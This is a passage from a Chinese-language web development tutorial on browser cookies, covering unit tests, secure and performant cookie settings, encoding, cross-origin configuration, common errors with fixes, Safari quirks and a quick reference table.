    }
    for (const cookie of event.deleted) {
      console.log('Cookie 删除:', cookie.name);
    }
  });
}
```

### 10.4 单元测试

```javascript
// Jest 测试示例
import Cookies from 'js-cookie';

describe('Cookie 操作', () => {
  beforeEach(() => {
    // 清理所有 Cookie
    Object.keys(Cookies.get()).forEach(name => {
      Cookies.remove(name);
    });
  });
  
  test('设置和读取 Cookie', () => {
    Cookies.set('name', 'John');
    expect(Cookies.get('name')).toBe('John');
  });
  
  test('删除 Cookie', () => {
    Cookies.set('name', 'John');
    Cookies.remove('name');
    expect(Cookies.get('name')).toBeUndefined();
  });
  
  test('Cookie 过期', () => {
    jest.useFakeTimers();
    
    Cookies.set('name', 'John', { expires: 1 }); // 1天
    expect(Cookies.get('name')).toBe('John');
    
    // 模拟时间流逝
    jest.advanceTimersByTime(2 * 24 * 60 * 60 * 1000); // 2天
    // 注意：js-cookie 不会自动清理过期 Cookie，这需要浏览器处理
    
    jest.useRealTimers();
  });
});

// 模拟 document.cookie
Object.defineProperty(document, 'cookie', {
  writable: true,
  value: ''
});
```

---

## 11. 最佳实践

### 11.1 安全最佳实践

```javascript
// ✅ 推荐的 Cookie 设置
const secureCookieOptions = {
  // 1. 始终设置 HttpOnly（服务端）
  httpOnly: true,
  
  // 2. 生产环境使用 Secure
  secure: process.env.NODE_ENV === 'production',
  
  // 3. 设置合适的 SameSite
  sameSite: 'strict', // 或 'lax'
  
  // 4. 限制 Path
  path: '/',
  
  // 5. 设置合理的过期时间
  maxAge: 7 * 24 * 60 * 60 * 1000, // 7天
  
  // 6. 必要时限制 Domain
  // domain: '.example.com'
};

// ❌ 避免的做法
// 1. 不要在 Cookie 中存储敏感信息
document.cookie = 'password=123456'; // 危险！

// 2. 不要使用过长的过期时间
document.cookie = 'token=xxx; max-age=315360000'; // 10年，太长了

// 3. 不要忽略 SameSite
document.cookie = 'token=xxx'; // 缺少 SameSite
```

### 11.2 性能最佳实践

```javascript
// 1. 减少 Cookie 大小
// ❌ 存储大量数据
document.cookie = 'userData=' + JSON.stringify(largeObject);

// ✅ 只存储必要的标识符
document.cookie = 'userId=12345';

// 2. 使用合适的 Path 限制 Cookie 发送范围
// ❌ 所有请求都发送
document.cookie = 'apiToken=xxx; path=/';

// ✅ 只在 API 请求时发送
document.cookie = 'apiToken=xxx; path=/api';

// 3. 静态资源使用独立域名（避免发送 Cookie）
// 主站: www.example.com（有 Cookie）
// 静态资源: static.example.com（无 Cookie）

// 4. 定期清理不需要的 Cookie
function cleanupCookies() {
  const unnecessaryCookies = ['temp', 'debug', 'test'];
  unnecessaryCookies.forEach(name => {
    document.cookie = `${name}=; max-age=-1; path=/`;
  });
}
```

### 11.3 编码最佳实践

```javascript
// 1. 始终编码 Cookie 值
// ❌ 可能包含特殊字符
document.cookie = 'name=John Doe; age=25';

// ✅ 使用 encodeURIComponent
document.cookie = `name=${encodeURIComponent('John Doe')}`;

// 2. 读取时解码
function getCookie(name) {
  const value = document.cookie
    .split('; ')
    .find(row => row.startsWith(name + '='))
    ?.split('=')[1];
  return value ? decodeURIComponent(value) : null;
}

// 3. 处理 JSON 数据
function setJsonCookie(name, data, options) {
  const value = encodeURIComponent(JSON.stringify(data));
  setCookie(name, value, options);
}

function getJsonCookie(name) {
  const value = getCookie(name);
  if (!value) return null;
  try {
    return JSON.parse(decodeURIComponent(value));
  } catch {
    return null;
  }
}
```

### 11.4 跨域最佳实践

```javascript
// 前端配置
fetch('https://api.example.com/data', {
  credentials: 'include', // 发送 Cookie
  headers: {
    'Content-Type': 'application/json'
  }
});

// 服务端配置（Node.js Express）
const cors = require('cors');

app.use(cors({
  origin: 'https://www.example.com', // 不能使用 *
  credentials: true, // 允许发送 Cookie
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));

// 设置跨域 Cookie
res.cookie('token', 'xxx', {
  httpOnly: true,
  secure: true,
  sameSite: 'none', // 跨域必须设置为 none
  domain: '.example.com'
});
```

---

## 12. 常见错误与解决方案

### 12.1 Cookie 无法设置

**问题**：`document.cookie = 'name=value'` 后 Cookie 没有生效

**可能原因与解决方案**：

```javascript
// 1. SameSite=None 但没有 Secure
// ❌ 错误
document.cookie = 'name=value; samesite=none';
// ✅ 正确
document.cookie = 'name=value; samesite=none; secure';

// 2. 在 HTTP 页面设置 Secure Cookie
// ❌ HTTP 页面无法设置 Secure Cookie
// ✅ 使用 HTTPS 或在开发环境移除 Secure

// 3. Domain 设置错误
// ❌ 不能设置不相关的域名
document.cookie = 'name=value; domain=other.com';
// ✅ 只能设置当前域名或父域名
document.cookie = 'name=value; domain=.example.com';

// 4. Path 不匹配
// 在 /admin 路径设置
document.cookie = 'name=value; path=/admin';
// 在 /user 路径无法读取

// 5. Cookie 大小超限
// ❌ 超过 4KB
document.cookie = 'data=' + 'x'.repeat(5000);
// ✅ 减小数据量或使用其他存储
```

### 12.2 Cookie 无法删除

**问题**：删除 Cookie 后仍然存在

```javascript
// 1. Path 不匹配
// 设置时
document.cookie = 'name=value; path=/admin';
// ❌ 删除时 path 不同
document.cookie = 'name=; max-age=-1; path=/';
// ✅ 删除时 path 相同
document.cookie = 'name=; max-age=-1; path=/admin';

// 2. Domain 不匹配
// 设置时
document.cookie = 'name=value; domain=.example.com';
// ❌ 删除时没有指定 domain
document.cookie = 'name=; max-age=-1';
// ✅ 删除时指定相同的 domain
document.cookie = 'name=; max-age=-1; domain=.example.com';

// 3. HttpOnly Cookie 无法通过 JavaScript 删除
// 只能由服务端删除
// 服务端: res.clearCookie('name', { httpOnly: true });
```

### 12.3 跨域 Cookie 问题

**问题**：跨域请求时 Cookie 没有发送

```javascript
// 1. 前端没有设置 credentials
// ❌ 错误
fetch('https://api.example.com/data');
// ✅ 正确
fetch('https://api.example.com/data', {
  credentials: 'include'
});

// 2. 服务端没有配置 CORS
// ✅ 服务端需要设置
// Access-Control-Allow-Origin: https://www.example.com
// Access-Control-Allow-Credentials: true

// 3. SameSite 限制
// ❌ 默认 Lax 不允许跨站 POST
// ✅ 设置 SameSite=None; Secure
res.cookie('token', 'xxx', {
  sameSite: 'none',
  secure: true
});

// 4. 第三方 Cookie 被浏览器阻止
// Safari 默认阻止第三方 Cookie
// 解决方案：使用第一方 Cookie + 服务端代理
```

### 12.4 Cookie 值被截断

**问题**：Cookie 值中的特殊字符导致问题

```javascript
// 1. 值中包含分号、等号等特殊字符
// ❌ 错误
document.cookie = 'data=a=1;b=2';
// ✅ 正确：编码
document.cookie = `data=${encodeURIComponent('a=1;b=2')}`;

// 2. 值中包含中文
// ❌ 可能出问题
document.cookie = 'name=张三';
// ✅ 正确：编码
document.cookie = `name=${encodeURIComponent('张三')}`;

// 3. JSON 数据
// ❌ 错误
document.cookie = 'user={"name":"John"}';
// ✅ 正确
document.cookie = `user=${encodeURIComponent(JSON.stringify({name:'John'}))}`;
```

### 12.5 Cookie 数量超限

**问题**：设置过多 Cookie 导致旧 Cookie 被删除

```javascript
// 浏览器限制每个域名约 50 个 Cookie
// 超出后会删除最旧的 Cookie

// 解决方案：
// 1. 合并多个 Cookie 为一个
// ❌ 多个 Cookie
document.cookie = 'pref_theme=dark';
document.cookie = 'pref_lang=zh';
document.cookie = 'pref_font=large';

// ✅ 合并为一个
const prefs = { theme: 'dark', lang: 'zh', font: 'large' };
document.cookie = `preferences=${encodeURIComponent(JSON.stringify(prefs))}`;

// 2. 使用 localStorage 存储非必要数据
localStorage.setItem('preferences', JSON.stringify(prefs));
```

### 12.6 时区问题

**问题**：Cookie 过期时间不正确

```javascript
// Expires 使用 UTC 时间
// ❌ 使用本地时间字符串
document.cookie = 'name=value; expires=2024-12-31 23:59:59';

// ✅ 使用 toUTCString()
const expires = new Date('2024-12-31T23:59:59');
document.cookie = `name=value; expires=${expires.toUTCString()}`;

// ✅ 或使用 Max-Age（推荐）
document.cookie = 'name=value; max-age=86400'; // 24小时
```

### 12.7 iOS Safari 特殊问题

**问题**：iOS Safari 对 Cookie 有特殊限制

```javascript
// 1. 隐私模式下 Cookie 可能不工作
// 检测隐私模式
function isPrivateMode() {
  try {
    localStorage.setItem('test', 'test');
    localStorage.removeItem('test');
    return false;
  } catch {
    return true;
  }
}

// 2. 第三方 Cookie 被阻止
// 使用 Storage Access API
if (document.hasStorageAccess) {
  const hasAccess = await document.hasStorageAccess();
  if (!hasAccess) {
    await document.requestStorageAccess();
  }
}

// 3. 7天过期限制（ITP）
// Safari 会将某些 Cookie 的有效期限制为 7 天
// 解决方案：定期刷新 Cookie
```

### 12.8 调试常见问题

```javascript
// 1. Cookie 设置了但看不到
// 检查 HttpOnly
// HttpOnly Cookie 在 document.cookie 中不可见
// 需要在 DevTools → Application → Cookies 中查看

// 2. Cookie 值显示为乱码
// 可能是编码问题
const value = decodeURIComponent(getCookie('name'));

// 3. 多个同名 Cookie
// 可能是不同 Path 或 Domain 的 Cookie
// 检查 DevTools 中的完整 Cookie 信息

// 调试工具函数
function debugAllCookies() {
  console.log('=== Cookie 调试信息 ===');
  console.log('document.cookie:', document.cookie);
  console.log('解析后:');
  document.cookie.split(';').forEach((cookie, index) => {
    const [name, value] = cookie.trim().split('=');
    console.log(`  ${index + 1}. ${name} = ${decodeURIComponent(value || '')}`);
  });
  console.log('提示: HttpOnly Cookie 无法在此显示，请查看 DevTools');
}
```

---

## 快速参考

### Cookie 属性速查表

| 属性 | 语法 | 说明 |
|------|------|------|
| 名称=值 | `name=value` | 必需，Cookie 的名称和值 |
| Expires | `expires=Date` | 绝对过期时间（UTC） |
| Max-Age | `max-age=seconds` | 相对过期时间（秒） |
| Domain | `domain=.example.com` | 可访问的域名 |
| Path | `path=/` | 可访问的路径 |
| Secure | `secure` | 仅 HTTPS 传输 |
| HttpOnly | `httponly` | 禁止 JS 访问（仅服务端） |
| SameSite | `samesite=Strict/Lax/None` | 跨站请求限制 |

### 常用代码片段

```javascript
// 设置 Cookie
document.cookie = `name=${encodeURIComponent(value)}; max-age=86400; path=/; secure; samesite=strict`;

// 读取 Cookie
const value = document.cookie.split('; ').find(row => row.startsWith('name='))?.split('=')[1];

// 删除 Cookie
document.cookie = 'name=; max-age=-1; path=/';

// 跨域请求携带 Cookie
fetch(url, { credentials: 'include' });
```

---

> 💡 **小贴士**：Cookie 虽然简单，但涉及安全性时需要格外小心。始终使用 HttpOnly、Secure 和 SameSite 属性保护敏感 Cookie，并定期审查 Cookie 的使用情况。
